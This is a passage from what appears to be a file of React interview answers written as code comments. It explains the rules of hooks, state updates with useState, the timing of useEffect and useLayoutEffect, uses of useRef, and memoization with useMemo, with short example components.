1. useState(0) → Hook slot 1 → state: 0
2. useState('') → Hook slot 2 → state: ''
3. useEffect(...) → Hook slot 3 → effect registered

Next render (must be same order):
1. useState(0) → Hook slot 1 → retrieve state from slot 1
2. useState('') → Hook slot 2 → retrieve state from slot 2
3. useEffect(...) → Hook slot 3 → check dependencies, run if needed

If you conditionally skip hook 2, React tries to match hook 3 to slot 2 → chaos!

Enforcing rules:

ESLint plugin:
npm install eslint-plugin-react-hooks

// .eslintrc
{
  "plugins": ["react-hooks"],
  "rules": {
    "react-hooks/rules-of-hooks": "error",      // Enforce rules
    "react-hooks/exhaustive-deps": "warn"       // Check useEffect dependencies
  }
}

This plugin catches violations at development time.

Summary of Rules:

1. ✅ Always call hooks at the top level (not in conditionals, loops, nested functions)
2. ✅ Only call hooks from React function components or custom hooks
3. ✅ Custom hooks must start with "use" prefix (convention + tooling relies on this)
4. ✅ Keep hook call order consistent across renders

Following these rules ensures React can correctly track hook state and effects.
*/


/**
23. What is useState and how does state updating work?
------------------------------------------------------

useState is a hook that adds state to function components. It returns the current state 
value and a function to update it.

Basic syntax:

const [state, setState] = useState(initialValue);

- state: current value
- setState: function to update state
- initialValue: starting value (used only on first render)

Example:

import { useState } from 'react';

function Counter() {
  const [count, setCount] = useState(0); // initial count is 0
  
  return (
    <div>
      <p>Count: {count}</p>
      <button onClick={() => setCount(count + 1)}>
        Increment
      </button>
    </div>
  );
}

Multiple state variables:

function Form() {
  const [name, setName] = useState('');
  const [age, setAge] = useState(0);
  const [isSubscribed, setIsSubscribed] = useState(false);
  
  return (
    <form>
      <input value={name} onChange={e => setName(e.target.value)} />
      <input type="number" value={age} onChange={e => setAge(Number(e.target.value))} />
      <input type="checkbox" checked={isSubscribed} onChange={e => setIsSubscribed(e.target.checked)} />
    </form>
  );
}

How state updating works:
--------------------------

1. Asynchronous updates:

State updates are asynchronous and may be batched for performance.

function Example() {
  const [count, setCount] = useState(0);
  
  const handleClick = () => {
    console.log('Before:', count); // 0
    setCount(count + 1);
    console.log('After:', count);  // Still 0! (not updated yet)
  };
  
  return <button onClick={handleClick}>{count}</button>;
}

The component re-renders with new state, but `count` in current execution context 
remains the old value.

2. Batching multiple updates:

React batches multiple setState calls in the same event handler:

function Example() {
  const [count, setCount] = useState(0);
  
  const handleClick = () => {
    setCount(count + 1); // count is 0, so sets to 1
    setCount(count + 1); // count is still 0, so sets to 1 again
    setCount(count + 1); // count is still 0, so sets to 1 again
    // Result: count becomes 1, not 3!
  };
  
  return <button onClick={handleClick}>{count}</button>;
}

Problem: All three use the same `count` value (0) from the render closure.

3. Functional updates:

To correctly update based on previous state, use functional form:

function Example() {
  const [count, setCount] = useState(0);
  
  const handleClick = () => {
    setCount(prev => prev + 1); // prev is the actual current state
    setCount(prev => prev + 1); // prev is the result of previous update
    setCount(prev => prev + 1); // prev is the result of previous update
    // Result: count becomes 3 ✅
  };
  
  return <button onClick={handleClick}>{count}</button>;
}

Functional form: setState(prevState => newState)
- React passes the latest state value to your function
- Use when new state depends on old state

4. Object and array state:

State must be replaced, not mutated:

BAD ❌:

function TodoList() {
  const [todos, setTodos] = useState([]);
  
  const addTodo = (text) => {
    todos.push({ id: Date.now(), text }); // ❌ Mutation!
    setTodos(todos); // React may not detect change (same reference)
  };
  
  return <div>...</div>;
}

GOOD ✅:

function TodoList() {
  const [todos, setTodos] = useState([]);
  
  const addTodo = (text) => {
    setTodos([...todos, { id: Date.now(), text }]); // ✅ New array
  };
  
  const removeTodo = (id) => {
    setTodos(todos.filter(t => t.id !== id)); // ✅ New array
  };
  
  const updateTodo = (id, newText) => {
    setTodos(todos.map(t => 
      t.id === id ? { ...t, text: newText } : t // ✅ New objects
    ));
  };
  
  return <div>...</div>;
}

For objects:

function UserProfile() {
  const [user, setUser] = useState({ name: '', email: '' });
  
  const updateName = (name) => {
    setUser({ ...user, name }); // ✅ Spread old values, override name
  };
  
  const updateEmail = (email) => {
    setUser(prev => ({ ...prev, email })); // ✅ Functional update
  };
  
  return <div>...</div>;
}

5. Lazy initialization:

If initial state is expensive to compute, pass a function:

function ExpensiveComponent() {
  // ❌ Bad: runs on every render
  const [data, setData] = useState(expensiveCalculation());
  
  // ✅ Good: only runs once on mount
  const [data, setData] = useState(() => expensiveCalculation());
  
  return <div>...</div>;
}

useState accepts:
- A value: used directly as initial state
- A function: called once on first render, return value is initial state

6. Bailing out of updates:

If you set state to the same value (Object.is comparison), React may skip re-render:

function Example() {
  const [count, setCount] = useState(0);
  
  const handleClick = () => {
    setCount(0); // Already 0, React may skip re-render
  };
  
  return <button onClick={handleClick}>{count}</button>;
}

React optimizes by checking if the new value is the same as current.

Real-world examples:

Toggle:

function Toggle() {
  const [isOn, setIsOn] = useState(false);
  
  return (
    <button onClick={() => setIsOn(prev => !prev)}>
      {isOn ? 'ON' : 'OFF'}
    </button>
  );
}

Input controlled component:

function NameInput() {
  const [name, setName] = useState('');
  
  return (
    <input
      value={name}
      onChange={e => setName(e.target.value)}
      placeholder="Enter name"
    />
  );
}

Derived state (computed from other state):

function ShoppingCart() {
  const [items, setItems] = useState([]);
  
  // Derived value, no separate state needed
  const total = items.reduce((sum, item) => sum + item.price, 0);
  
  return (
    <div>
      <p>Total: ${total}</p>
    </div>
  );
}

Summary:

- useState(initialValue) returns [state, setState]
- Updates are asynchronous and may be batched
- Use functional updates when new state depends on old: setState(prev => ...)
- Always replace state (new object/array), never mutate
- React compares new state with old using Object.is to optimize re-renders
*/


/**
24. What is useEffect and when is it triggered?
-----------------------------------------------

useEffect is a hook for side effects in function components. Side effects are operations 
that affect things outside the component: data fetching, subscriptions, DOM manipulation, 
timers, logging, etc.

Basic syntax:

useEffect(() => {
  // Side effect code here
  
  return () => {
    // Cleanup code (optional)
  };
}, [dependencies]);

- First argument: effect function (runs after render)
- Second argument: dependency array (controls when effect runs)
- Return value: cleanup function (runs before next effect or unmount)

When useEffect is triggered:
-----------------------------

1. After every render (no dependency array):

useEffect(() => {
  console.log('Runs after every render');
});

Use case: Rare; usually you want to control when effects run.

2. Only on mount (empty dependency array):

useEffect(() => {
  console.log('Runs once after initial mount');
  
  return () => {
    console.log('Cleanup on unmount');
  };
}, []); // ← empty array

Equivalent to componentDidMount + componentWillUnmount

Example - data fetching:

function UserProfile({ userId }) {
  const [user, setUser] = useState(null);
  
  useEffect(() => {
    fetch(`/api/users/${userId}`)
      .then(res => res.json())
      .then(data => setUser(data));
  }, []); // Only fetch on mount
  
  return <div>{user?.name}</div>;
}

3. When specific dependencies change:

useEffect(() => {
  console.log('Runs when count changes');
}, [count]); // ← depends on count

React compares dependency values between renders using Object.is:
- If any dependency changed, effect runs
- If all dependencies same, effect skipped

Example - sync with external system:

function ChatRoom({ roomId }) {
  useEffect(() => {
    const connection = createConnection(roomId);
    connection.connect();
    
    return () => {
      connection.disconnect(); // Cleanup previous connection
    };
  }, [roomId]); // Re-run when roomId changes
  
  return <div>Connected to {roomId}</div>;
}

Behavior:
- Mount: effect runs (connect to room A)
- roomId changes A → B: cleanup runs (disconnect A), effect runs (connect B)
- Unmount: cleanup runs (disconnect B)

Execution order:
----------------

1. Component renders
2. React commits changes to DOM
3. Browser paints
4. useEffect runs (after paint, non-blocking)

function Example() {
  const [count, setCount] = useState(0);
  
  useEffect(() => {
    console.log('Effect ran');
    document.title = `Count: ${count}`;
  }, [count]);
  
  console.log('Render phase');
  return <button onClick={() => setCount(c => c + 1)}>{count}</button>;
}

Log order:
1. "Render phase"
2. (React updates DOM)
3. (Browser paints)
4. "Effect ran"

Common use cases:
-----------------

1. Data fetching:

useEffect(() => {
  async function fetchData() {
    const res = await fetch('/api/data');
    const data = await res.json();
    setData(data);
  }
  
  fetchData();
}, []);

2. Subscriptions:

useEffect(() => {
  const subscription = someAPI.subscribe(data => {
    setData(data);
  });
  
  return () => {
    subscription.unsubscribe(); // Cleanup
  };
}, []);

3. Event listeners:

useEffect(() => {
  const handleResize = () => {
    setWindowWidth(window.innerWidth);
  };
  
  window.addEventListener('resize', handleResize);
  
  return () => {
    window.removeEventListener('resize', handleResize);
  };
}, []);

4. Timers:

useEffect(() => {
  const timer = setInterval(() => {
    setCount(c => c + 1);
  }, 1000);
  
  return () => clearInterval(timer);
}, []);

5. Manual DOM manipulation:

useEffect(() => {
  const element = document.getElementById('my-element');
  element.focus();
}, []);

6. Syncing with external state:

useEffect(() => {
  localStorage.setItem('theme', theme);
}, [theme]);

Cleanup function:
-----------------

Always return a cleanup function if your effect:
- Creates subscriptions
- Starts timers
- Adds event listeners
- Opens connections

function Example() {
  useEffect(() => {
    console.log('Effect setup');
    
    return () => {
      console.log('Effect cleanup');
    };
  }, [dependency]);
}

Cleanup runs:
- Before effect re-runs (dependency changed)
- Before component unmounts

Example lifecycle with cleanup:

Mount:
  → "Effect setup"

Dependency changes:
  → "Effect cleanup"
  → "Effect setup"

Unmount:
  → "Effect cleanup"

Dependency array gotchas:
-------------------------

1. Missing dependencies:

function Example({ userId }) {
  const [user, setUser] = useState(null);
  
  useEffect(() => {
    fetchUser(userId).then(setUser);
  }, []); // ❌ Missing userId!
  
  // If userId changes, effect doesn't re-run → stale data
}

Fix:

useEffect(() => {
  fetchUser(userId).then(setUser);
}, [userId]); // ✅ Include all used values

2. Object/array dependencies:

const options = { id: userId }; // New object every render

useEffect(() => {
  fetchUser(options);
}, [options]); // ❌ Effect runs every render (new object)

Fix - primitive dependencies:

useEffect(() => {
  const options = { id: userId };
  fetchUser(options);
}, [userId]); // ✅ Depend on primitive

Or useMemo:

const options = useMemo(() => ({ id: userId }), [userId]);

useEffect(() => {
  fetchUser(options);
}, [options]); // ✅ Stable reference

3. ESLint exhaustive-deps:

The eslint-plugin-react-hooks warns about missing dependencies:

useEffect(() => {
  fetchUser(userId);
}, []); // ⚠️ Warning: userId should be in dependency array

Always fix these warnings or explicitly document why you're ignoring them.

Multiple effects:

Split different concerns into separate effects:

function UserProfile({ userId }) {
  // Effect 1: Fetch user data
  useEffect(() => {
    fetchUser(userId).then(setUser);
  }, [userId]);
  
  // Effect 2: Update document title
  useEffect(() => {
    document.title = user?.name || 'Loading...';
  }, [user]);
  
  // Effect 3: Analytics
  useEffect(() => {
    trackPageView(userId);
  }, [userId]);
}

This is cleaner than one giant effect and allows each to have specific dependencies.

Summary:

- useEffect runs side effects after render
- Dependency array controls when effect re-runs:
  - No array: every render
  - []: only on mount
  - [dep1, dep2]: when dependencies change
- Return cleanup function to undo side effects
- Always include all dependencies used in effect
- Use ESLint plugin to catch dependency issues
*/


/**
25. Difference between useEffect and useLayoutEffect?
-----------------------------------------------------

useEffect and useLayoutEffect are both hooks for side effects, but they run at different 
times relative to rendering and browser paint.

useEffect (most common):
------------------------

Runs AFTER browser paint (asynchronous):

1. React renders component
2. React commits changes to DOM
3. Browser paints (user sees updates)
4. useEffect runs

Example:

function Example() {
  const [count, setCount] = useState(0);
  
  useEffect(() => {
    console.log('useEffect ran'); // After paint
  });
  
  return <div>{count}</div>;
}

Timeline:
  Render → Commit to DOM → Browser Paint → useEffect

Characteristics:
- Non-blocking: doesn't delay visual updates
- Runs asynchronously after paint
- Preferred for most side effects (data fetching, subscriptions, analytics)
- Better for performance (doesn't block painting)

useLayoutEffect (rare):
-----------------------

Runs BEFORE browser paint (synchronous):

1. React renders component
2. React commits changes to DOM
3. useLayoutEffect runs (synchronously)
4. Browser paints

Example:

function Example() {
  const [count, setCount] = useState(0);
  
  useLayoutEffect(() => {
    console.log('useLayoutEffect ran'); // Before paint
  });
  
  return <div>{count}</div>;
}

Timeline:
  Render → Commit to DOM → useLayoutEffect → Browser Paint

Characteristics:
- Blocking: delays visual updates until effect completes
- Runs synchronously before paint
- Used when you need to read layout or mutate DOM before user sees it
- Can hurt performance if effect is slow

When to use which:
------------------

Use useEffect (99% of cases):
- Data fetching
- Setting up subscriptions
- Event listeners
- Analytics tracking
- LocalStorage updates
- Any side effect that doesn't need to happen before paint

Use useLayoutEffect (rare):
- Reading layout from DOM (scroll position, element sizes)
- Making DOM mutations before user sees them (to avoid flicker)
- Measuring elements
- Synchronous DOM updates

Real-world examples:
--------------------

Example 1: Reading layout (useLayoutEffect)

Tooltip that positions itself based on target element:

function Tooltip({ targetRef, children }) {
  const [position, setPosition] = useState({ top: 0, left: 0 });
  
  useLayoutEffect(() => {
    // Read layout before paint to position tooltip correctly
    const targetRect = targetRef.current.getBoundingClientRect();
    setPosition({
      top: targetRect.bottom + 10,
      left: targetRect.left
    });
  }, [targetRef]);
  
  return (
    <div style={{ position: 'absolute', ...position }}>
      {children}
    </div>
  );
}

Why useLayoutEffect?
- If we used useEffect, tooltip would briefly appear at wrong position, then jump to 
  correct position (flicker).
- useLayoutEffect calculates position before paint, so user never sees incorrect position.

Example 2: Preventing flicker (useLayoutEffect)

function AnimatedComponent() {
  const ref = useRef();
  
  useLayoutEffect(() => {
    // Measure element and set initial animation state before user sees it
    const width = ref.current.offsetWidth;
    ref.current.style.transform = `translateX(${width}px)`;
    
    // Then trigger animation
    requestAnimationFrame(() => {
      ref.current.style.transform = 'translateX(0)';
    });
  }, []);
  
  return <div ref={ref}>Content</div>;
}

Example 3: Data fetching (useEffect - correct choice)

function UserProfile({ userId }) {
  const [user, setUser] = useState(null);
  
  // ✅ useEffect: data fetching doesn't need to block paint
  useEffect(() => {
    fetch(`/api/users/${userId}`)
      .then(res => res.json())
      .then(setUser);
  }, [userId]);
  
  return <div>{user?.name}</div>;
}

If we used useLayoutEffect here, it would block painting while fetching data → bad UX.

Example 4: Scroll restoration (useLayoutEffect)

function ScrollRestoration({ scrollPosition }) {
  useLayoutEffect(() => {
    // Restore scroll before paint to avoid jump
    window.scrollTo(0, scrollPosition);
  }, [scrollPosition]);
  
  return <div>Content</div>;
}

Why useLayoutEffect?
- If we used useEffect, user would briefly see page at top, then jump to saved position.
- useLayoutEffect scrolls before paint, so user never sees the jump.

Example 5: Focus management (useLayoutEffect)

function Modal({ isOpen }) {
  const firstInputRef = useRef();
  
  useLayoutEffect(() => {
    if (isOpen && firstInputRef.current) {
      // Focus before user sees modal to avoid visible delay
      firstInputRef.current.focus();
    }
  }, [isOpen]);
  
  if (!isOpen) return null;
  
  return (
    <div className="modal">
      <input ref={firstInputRef} />
    </div>
  );
}

Comparison table:
-----------------

Aspect                | useEffect                | useLayoutEffect
----------------------|--------------------------|---------------------------
Timing                | After paint              | Before paint
Blocking              | Non-blocking             | Blocking
Performance           | Better (doesn't delay)   | Worse (can delay paint)
Use for               | Most side effects        | Layout measurements, DOM mutations
Visual updates        | May cause flicker        | Prevents flicker
Server rendering      | Safe                     | Warning in SSR

Performance impact:
-------------------

useEffect:

function Example() {
  useEffect(() => {
    // Slow operation, but doesn't block painting
    for (let i = 0; i < 1000000; i++) { / * work * / }
  });
  
  return <div>User sees this immediately</div>;
}

User sees UI quickly, then effect runs.

useLayoutEffect:

function Example() {
  useLayoutEffect(() => {
    // Slow operation blocks painting!
    for (let i = 0; i < 1000000; i++) { / * work * / }
  });
  
  return <div>User waits to see this</div>;
}

User waits for effect to complete before seeing UI.

Server-side rendering (SSR):
-----------------------------

useLayoutEffect causes warnings in SSR because there's no DOM to measure/mutate:

Warning: useLayoutEffect does nothing on the server

If you must use useLayoutEffect but also support SSR:

function useIsomorphicLayoutEffect(effect, deps) {
  const isServer = typeof window === 'undefined';
  const useEffectFn = isServer ? useEffect : useLayoutEffect;
  
  useEffectFn(effect, deps);
}

Or conditionally render:

function Component() {
  const [isMounted, setIsMounted] = useState(false);
  
  useEffect(() => {
    setIsMounted(true);
  }, []);
  
  useLayoutEffect(() => {
    if (!isMounted) return; // Skip on server
    // Layout effect code
  }, [isMounted]);
}

When to switch from useEffect to useLayoutEffect:
--------------------------------------------------

If you see:
1. Visual flicker or jump
2. Incorrect initial layout
3. Race conditions with DOM measurements

Then try useLayoutEffect. Otherwise, stick with useEffect.

Rule of thumb:
- Default to useEffect
- Only use useLayoutEffect when you have a specific visual/layout problem
- Test performance impact of useLayoutEffect

Summary:

- useEffect: After paint, non-blocking, for most side effects
- useLayoutEffect: Before paint, blocking, for layout measurements and DOM mutations
- Prefer useEffect unless you have flicker/layout issues
- useLayoutEffect can hurt performance, use sparingly
*/


/**
26. What is useRef and what problems does it solve?
---------------------------------------------------

useRef is a hook that returns a mutable ref object with a `.current` property that 
persists across renders without causing re-renders when changed.

Syntax:

const ref = useRef(initialValue);

// Access/modify via .current
ref.current = newValue;

Key characteristics:
- Persists across renders (like instance variables in classes)
- Mutating .current doesn't trigger re-render
- Returns same ref object on every render (stable reference)
- Can hold any value (DOM elements, timers, previous values, etc.)

Problems useRef solves:
-----------------------

Problem 1: Accessing DOM elements
----------------------------------

Solution: Use ref to get direct reference to DOM node

function TextInputWithFocusButton() {
  const inputRef = useRef(null);
  
  const handleClick = () => {
    inputRef.current.focus(); // Direct DOM manipulation
  };
  
  return (
    <>
      <input ref={inputRef} type="text" />
      <button onClick={handleClick}>Focus Input</button>
    </>
  );
}

Why this works:
- React assigns the DOM node to inputRef.current after rendering
- You can imperatively call DOM methods

Problem 2: Storing mutable values that don't cause re-renders
--------------------------------------------------------------

State vs Ref comparison:

// useState: re-renders on change
function CounterWithState() {
  const [count, setCount] = useState(0);
  
  const increment = () => {
    setCount(c => c + 1); // Triggers re-render
  };
  
  return <div>{count}</div>; // Shows updated value
}

// useRef: no re-render on change
function CounterWithRef() {
  const countRef = useRef(0);
  
  const increment = () => {
    countRef.current += 1; // No re-render!
    console.log(countRef.current); // Updates, but UI doesn't
  };
  
  return <div>{countRef.current}</div>; // Won't update on screen
}

When to use ref instead of state:
- Value changes but UI doesn't need to update
- Storing timers, intervals, subscriptions
- Caching expensive computations
- Tracking previous values

Problem 3: Storing timer IDs
-----------------------------

function Timer() {
  const [seconds, setSeconds] = useState(0);
  const timerRef = useRef(null);
  
  const start = () => {
    if (timerRef.current) return; // Already running
    
    timerRef.current = setInterval(() => {
      setSeconds(s => s + 1);
    }, 1000);
  };
  
  const stop = () => {
    clearInterval(timerRef.current);
    timerRef.current = null;
  };
  
  useEffect(() => {
    return () => clearInterval(timerRef.current); // Cleanup
  }, []);
  
  return (
    <div>
      <p>Seconds: {seconds}</p>
      <button onClick={start}>Start</button>
      <button onClick={stop}>Stop</button>
    </div>
  );
}

Why ref?
- Timer ID needs to persist across renders
- Changing timer ID shouldn't cause re-render
- Can access in cleanup function

Problem 4: Tracking previous values
------------------------------------

function usePrevious(value) {
  const prevRef = useRef();
  
  useEffect(() => {
    prevRef.current = value; // Store after render
  });
  
  return prevRef.current; // Return previous value
}

function Counter() {
  const [count, setCount] = useState(0);
  const prevCount = usePrevious(count);
  
  return (
    <div>
      <p>Current: {count}</p>
      <p>Previous: {prevCount}</p>
      <button onClick={() => setCount(c => c + 1)}>Increment</button>
    </div>
  );
}

How it works:
- First render: prevCount is undefined
- Click: count becomes 1, prevCount still 0 (from before effect ran)
- Effect runs after render, updates prevRef.current to 1
- Next render: prevCount is 1

Problem 5: Avoiding stale closures in callbacks
------------------------------------------------

function ChatRoom() {
  const [message, setMessage] = useState('');
  const latestMessageRef = useRef('');
  
  useEffect(() => {
    latestMessageRef.current = message; // Keep ref updated
  }, [message]);
  
  useEffect(() => {
    const timer = setInterval(() => {
      console.log('Latest message:', latestMessageRef.current);
      // Always reads current message, not stale closure value
    }, 1000);
    
    return () => clearInterval(timer);
  }, []); // Empty deps, but latestMessageRef.current is always fresh
  
  return <input value={message} onChange={e => setMessage(e.target.value)} />;
}

Why this works:
- Without ref, setInterval closure captures initial message value
- With ref, we read latestMessageRef.current which always has latest value

Problem 6: Measuring elements
------------------------------

function MeasureExample() {
  const divRef = useRef();
  const [dimensions, setDimensions] = useState({ width: 0, height: 0 });
  
  useEffect(() => {
    const measure = () => {
      if (divRef.current) {
        const { width, height } = divRef.current.getBoundingClientRect();
        setDimensions({ width, height });
      }
    };
    
    measure();
    window.addEventListener('resize', measure);
    return () => window.removeEventListener('resize', measure);
  }, []);
  
  return (
    <div ref={divRef}>
      Size: {dimensions.width} x {dimensions.height}
    </div>
  );
}

Problem 7: Callback refs for dynamic measurements
--------------------------------------------------

Sometimes you need to run code when ref is attached:

function MeasureOnMount() {
  const [height, setHeight] = useState(0);
  
  // Callback ref: function called when element is attached/detached
  const measureRef = useCallback(node => {
    if (node !== null) {
      setHeight(node.getBoundingClientRect().height);
    }
  }, []);
  
  return (
    <div ref={measureRef}>
      Height: {height}px
    </div>
  );
}

Callback ref signature:
- Called with DOM node when element mounts
- Called with null when element unmounts

Problem 8: Forwarding refs to child components
-----------------------------------------------

Parent needs ref to child's DOM:

const FancyInput = React.forwardRef((props, ref) => {
  return <input ref={ref} className="fancy-input" {...props} />;
});

function Parent() {
  const inputRef = useRef();
  
  const focusInput = () => {
    inputRef.current.focus();
  };
  
  return (
    <>
      <FancyInput ref={inputRef} />
      <button onClick={focusInput}>Focus</button>
    </>
  );
}

Without forwardRef, refs aren't passed to function components.

Problem 9: Instance variables (class component equivalent)
-----------------------------------------------------------

Class component:

class Example extends React.Component {
  userId = null; // Instance variable
  
  componentDidMount() {
    this.userId = fetchUserId();
  }
}

Function component with useRef:

function Example() {
  const userIdRef = useRef(null);
  
  useEffect(() => {
    userIdRef.current = fetchUserId();
  }, []);
}

Problem 10: Avoiding unnecessary effects
-----------------------------------------

Tracking if component is mounted:

function DataFetcher() {
  const isMountedRef = useRef(true);
  const [data, setData] = useState(null);
  
  useEffect(() => {
    async function fetchData() {
      const result = await fetch('/api/data');
      const json = await result.json();
      
      // Only update state if still mounted
      if (isMountedRef.current) {
        setData(json);
      }
    }
    
    fetchData();
    
    return () => {
      isMountedRef.current = false; // Mark as unmounted
    };
  }, []);
  
  return <div>{data}</div>;
}

This prevents "Can't perform a React state update on an unmounted component" warnings.

Common patterns:
----------------

Pattern 1: Caching expensive values

function ExpensiveComponent({ data }) {
  const cacheRef = useRef(new Map());
  
  const processData = (id) => {
    if (cacheRef.current.has(id)) {
      return cacheRef.current.get(id); // Return cached
    }
    
    const result = expensiveOperation(data[id]);
    cacheRef.current.set(id, result); // Cache for next time
    return result;
  };
  
  return <div>{processData(123)}</div>;
}

Pattern 2: Debouncing without recreating timer

function SearchBox() {
  const [query, setQuery] = useState('');
  const timerRef = useRef();
  
  const handleChange = (e) => {
    const value = e.target.value;
    setQuery(value);
    
    clearTimeout(timerRef.current);
    timerRef.current = setTimeout(() => {
      performSearch(value);
    }, 500);
  };
  
  useEffect(() => {
    return () => clearTimeout(timerRef.current);
  }, []);
  
  return <input value={query} onChange={handleChange} />;
}

Pattern 3: Ref callback for multiple elements

function MultiElementMeasure() {
  const elementsRef = useRef(new Map());
  
  const setRef = useCallback((id) => (node) => {
    if (node) {
      elementsRef.current.set(id, node);
    } else {
      elementsRef.current.delete(id);
    }
  }, []);
  
  return (
    <>
      <div ref={setRef('div1')}>Element 1</div>
      <div ref={setRef('div2')}>Element 2</div>
    </>
  );
}

Ref vs State decision tree:
----------------------------

Use useState when:
✅ Value changes should re-render component
✅ Value is displayed in UI
✅ Value affects what user sees

Use useRef when:
✅ Value changes shouldn't trigger re-render
✅ Need to access DOM elements
✅ Storing timers, subscriptions, IDs
✅ Tracking values without triggering effects
✅ Caching values between renders
✅ Working with third-party imperative APIs

Summary:

useRef solves:
1. DOM access (most common use)
2. Storing mutable values without re-renders
3. Persisting values across renders
4. Timer/interval IDs
5. Previous value tracking
6. Avoiding stale closures
7. Instance variables in function components
8. Caching and performance optimizations
*/


/**
27. What is useMemo and why is memoization important?
-----------------------------------------------------

useMemo is a hook that memoizes (caches) the result of an expensive calculation, 
recomputing only when dependencies change.

Syntax:

const memoizedValue = useMemo(() => computeExpensiveValue(a, b), [a, b]);

- First argument: function that computes the value
- Second argument: dependency array
- Returns: cached value until dependencies change

Why memoization is important:
------------------------------

1. Avoid expensive recalculations
2. Maintain referential equality (prevent unnecessary re-renders)
3. Improve performance in large component trees
4. Optimize child components that depend on props

Problem 1: Expensive calculations on every render
--------------------------------------------------

WITHOUT useMemo (bad performance):

function ProductList({ products, filter }) {
  // This runs on EVERY render, even if products/filter haven't changed
  const filteredProducts = products.filter(p => {
    // Expensive operation
    return expensiveFilterLogic(p, filter);
  });
  
  return (
    <div>
      {filteredProducts.map(p => <ProductCard key={p.id} product={p} />)}
    </div>
  );
}

If parent re-renders (e.g., unrelated state changes), this expensive filter runs again!

WITH useMemo (optimized):

function ProductList({ products, filter }) {
  // Only recalculates when products or filter change
  const filteredProducts = useMemo(() => {
    return products.filter(p => expensiveFilterLogic(p, filter));
  }, [products, filter]);
  
  return (
    <div>
      {filteredProducts.map(p => <ProductCard key={p.id} product={p} />)}
    </div>
  );
}

Now if parent re-renders but products/filter haven't changed, filteredProducts is reused.

Problem 2: Referential equality and child re-renders
-----------------------------------------------------

JavaScript objects/arrays are compared by reference:

const obj1 = { a: 1 };
const obj2 = { a: 1 };
obj1 === obj2; // false (different references)

WITHOUT useMemo:

function Parent() {
  const [count, setCount] = useState(0);
  
  // New object created on every render!
  const config = { theme: 'dark', fontSize: 14 };
  
  return (
    <div>
      <button onClick={() => setCount(c => c + 1)}>Count: {count}</button>
      <Child config={config} />
    </div>
  );
}

const Child = React.memo(({ config }) => {
  console.log('Child rendered');
  return <div>Theme: {config.theme}</div>;
});

Result: Child re-renders on every Parent render, even though config values are same
(because config is a new object reference each time).

WITH useMemo:

function Parent() {
  const [count, setCount] = useState(0);
  
  // Same object reference unless dependencies change
  const config = useMemo(() => ({
    theme: 'dark',
    fontSize: 14
  }), []); // Empty deps = never changes
  
  return (
    <div>
      <button onClick={() => setCount(c => c + 1)}>Count: {count}</button>
      <Child config={config} />
    </div>
  );
}

const Child = React.memo(({ config }) => {
  console.log('Child rendered');
  return <div>Theme: {config.theme}</div>;
});

Result: Child only renders once, skips subsequent re-renders (config reference is stable).

Real-world examples:
--------------------

Example 1: Filtering/sorting large lists

function DataTable({ data, sortBy, filterText }) {
  const processedData = useMemo(() => {
    // Step 1: Filter
    let filtered = data.filter(item => 
      item.name.toLowerCase().includes(filterText.toLowerCase())
    );
    
    // Step 2: Sort
    filtered.sort((a, b) => {
      if (sortBy === 'name') return a.name.localeCompare(b.name);
      if (sortBy === 'price') return a.price - b.price;
      return 0;
    });
    
    return filtered;
  }, [data, sortBy, filterText]);
  
  return (
    <table>
      {processedData.map(item => (
        <tr key={item.id}>
          <td>{item.name}</td>
          <td>${item.price}</td>
        </tr>
      ))}
    </table>
  );
}

Example 2: Computing derived state

function ShoppingCart({ items }) {
  const summary = useMemo(() => {
    const subtotal = items.reduce((sum, item) => sum + item.price * item.quantity, 0);
    const tax = subtotal * 0.1;
    const shipping = subtotal > 50 ? 0 : 5;
    const total = subtotal + tax + shipping;
    
    return { subtotal, tax, shipping, total };
  }, [items]);
  
  return (
    <div>
      <p>Subtotal: ${summary.subtotal}</p>
      <p>Tax: ${summary.tax}</p>
      <p>Shipping: ${summary.shipping}</p>
      <p>Total: ${summary.total}</p>
    </div>
  );
}

Example 3: Expensive regex/validation

function EmailValidator({ email }) {
  const validation = useMemo(() => {
    if (!email) return { valid: false, message: 'Required' };
    
    // Expensive regex
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    const valid = emailRegex.test(email);
    
    return {
      valid,
      message: valid ? 'Valid email' : 'Invalid email format'
    };
  }, [email]);
  
  return (
    <div>
      <input value={email} />
      <p style={{ color: validation.valid ? 'green' : 'red' }}>
        {validation.message}
      </p>
    </div>
  );
}

Example 4: Memoizing style objects

function StyledComponent({ size }) {
  // Prevent new style object on every render
  const styles = useMemo(() => ({
    container: {
      width: size === 'large' ? '400px' : '200px',
      padding: '20px',
      boxShadow: '0 2px 4px rgba(0,0,0,0.1)'
    },
    title: {
      fontSize: size === 'large' ? '24px' : '16px'
    }
  }), [size]);
  
  return (
    <div style={styles.container}>
      <h1 style={styles.title}>Title</h1>
    </div>
  );
}

Example 5: Context value optimization

const ThemeContext = React.createContext();

function ThemeProvider({ children }) {
  const [theme, setTheme] = useState('light');
  
  // Prevent new context value object on every render
  const value = useMemo(() => ({
    theme,
    setTheme
  }), [theme]);
  
  return (
    <ThemeContext.Provider value={value}>
      {children}
    </ThemeContext.Provider>
  );
}

Without useMemo, every render creates new { theme, setTheme } object → all consumers 
re-render unnecessarily.

When NOT to use useMemo:
-------------------------

1. Simple calculations:

// Don't memoize simple operations
const doubled = useMemo(() => count * 2, [count]); // Overkill!

// Just do it directly
const doubled = count * 2;

2. Primitive values:

// Don't memoize primitives
const value = useMemo(() => 42, []); // Pointless!

// Primitives are compared by value anyway
const value = 42;

3. Values only used once:

// Don't memoize if not passed to children or used multiple times
const temporary = useMemo(() => transform(data), [data]);
return <div>{temporary}</div>; // Only used once, no benefit

4. Premature optimization:

// Don't memoize everything "just in case"
const x = useMemo(() => a + b, [a, b]); // Addition is cheap!
const y = useMemo(() => arr.length, [arr]); // .length is instant!

When TO use useMemo:
--------------------

✅ Expensive calculations (loops, complex algorithms)
✅ Referential equality matters (passed to React.memo components)
✅ Large list operations (filter, sort, map)
✅ Objects/arrays passed as props or context values
✅ Dependencies in other hooks (useEffect, useMemo, useCallback)

Decision tree:

Is the calculation expensive (>10ms)?
  ├─ YES → Use useMemo
  └─ NO → Is the value passed to optimized child (React.memo)?
          ├─ YES → Use useMemo (for referential equality)
          └─ NO → Don't use useMemo

useMemo vs useCallback:
------------------------

useMemo: Memoizes a VALUE
const memoizedValue = useMemo(() => computeValue(), [deps]);

useCallback: Memoizes a FUNCTION
const memoizedFn = useCallback(() => { / * function * / }, [deps]);

Actually, useCallback is just syntactic sugar:
useCallback(fn, deps) === useMemo(() => fn, deps)

Performance considerations:
---------------------------

useMemo itself has cost:
- Creates closure
- Stores value in memory
